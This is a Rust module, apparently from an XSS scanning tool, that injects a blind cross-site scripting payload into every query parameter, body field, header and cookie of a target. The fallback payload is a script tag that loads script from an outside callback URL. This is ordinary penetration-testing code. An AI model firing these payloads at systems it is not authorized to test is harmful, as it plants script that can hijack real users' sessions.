use crate::target_parser::Target;

pub async fn blind_scanning(target: &Target, callback_url: &str) {
    let template = crate::payload::XSS_BLIND_PAYLOADS
        .first()
        .copied()
        .unwrap_or("\"'><script src={}></script>");
    let payload = template.replace("{}", callback_url);

    // Collect all params with static str types to avoid per-param String allocation
    let mut all_params: Vec<(String, &str)> = Vec::new();

    // Query params
    for (k, _v) in target.url.query_pairs() {
        all_params.push((k.into_owned(), "query"));
    }

    // Body params
    if let Some(data) = &target.data {
        for pair in data.split('&') {
            if let Some((k, _v)) = pair.split_once('=') {
                all_params.push((k.to_string(), "body"));
            }
        }
    }

    // Headers
    for (k, _v) in &target.headers {
        all_params.push((k.clone(), "header"));
    }

    // Cookies
    for (k, _v) in &target.cookies {
        all_params.push((k.clone(), "cookie"));
    }

    // Send requests for each param
    for (param_name, param_type) in &all_params {
        send_blind_request(target, param_name, &payload, param_type).await;
    }
}

async fn send_blind_request(target: &Target, param_name: &str, payload: &str, param_type: &str) {
    use tokio::time::{Duration, sleep};
    use url::form_urlencoded;

    let client = target.build_client_or_default();

    let url = match param_type {
        "query" => {
            let mut pairs: Vec<(String, String)> = target
                .url
                .query_pairs()
                .map(|(k, v)| (k.to_string(), v.to_string()))
                .collect();
            let mut found = false;
            for pair in &mut pairs {
                if pair.0 == param_name {
                    pair.1 = payload.to_string();
                    found = true;
                    break;
                }
            }
            if !found {
                pairs.push((param_name.to_string(), payload.to_string()));
            }
            let query = form_urlencoded::Serializer::new(String::new())
                .extend_pairs(&pairs)
                .finish();
            let mut url = target.url.clone();
            url.set_query(Some(&query));
            url
        }
        "body" => target.url.clone(),
        "header" => target.url.clone(),
        "cookie" => target.url.clone(),
        _ => target.url.clone(),
    };

    let mut request = client.request(target.parse_method(), url.clone());

    let mut headers = target.headers.clone();
    let mut cookies = target.cookies.clone();
    let mut body = target.data.clone();

    match param_type {
        "query" => {
            // Already handled in url
        }
        "body" => {
            if let Some(data) = &target.data {
                // Simple replace, assuming param=value& format
                body = Some(
                    data.replace(
                        &format!("{}=", param_name),
                        &format!("{}={}&", param_name, payload),
                    )
                    .trim_end_matches('&')
                    .to_string(),
                );
            }
        }
        "header" => {
            for (k, v) in &mut headers {
                if k == param_name {
                    *v = payload.to_string();
                }
            }
        }
        "cookie" => {
            for (k, v) in &mut cookies {
                if k == param_name {
                    *v = payload.to_string();
                }
            }
        }
        _ => {}
    }

    for (k, v) in &headers {
        request = request.header(k, v);
    }
    if let Some(ua) = &target.user_agent {
        request = request.header("User-Agent", ua);
    }
    let mut cookie_header = String::new();
    for (i, (k, v)) in cookies.iter().enumerate() {
        if i > 0 {
            cookie_header.push_str("; ");
        }
        cookie_header.push_str(k);
        cookie_header.push('=');
        cookie_header.push_str(v);
    }
    if !cookie_header.is_empty() {
        request = request.header("Cookie", cookie_header);
    }
    if let Some(b) = &body {
        request = request.body(b.clone());
    }

    // Send the request. We don't inspect the response (blind payloads report
    // out-of-band), but surface transport errors at DEBUG so users can tell a
    // delivery failure apart from a target that simply never calls back.
    crate::tick_request_count();
    if let Err(e) = request.send().await
        && crate::DEBUG.load(std::sync::atomic::Ordering::Relaxed)
    {
        eprintln!(
            "[DBG] blind request failed param={} type={}: {}",
            param_name, param_type, e
        );
    }

    if target.delay > 0 {
        sleep(Duration::from_millis(target.delay)).await;
    }
}

#[cfg(test)]
mod tests;
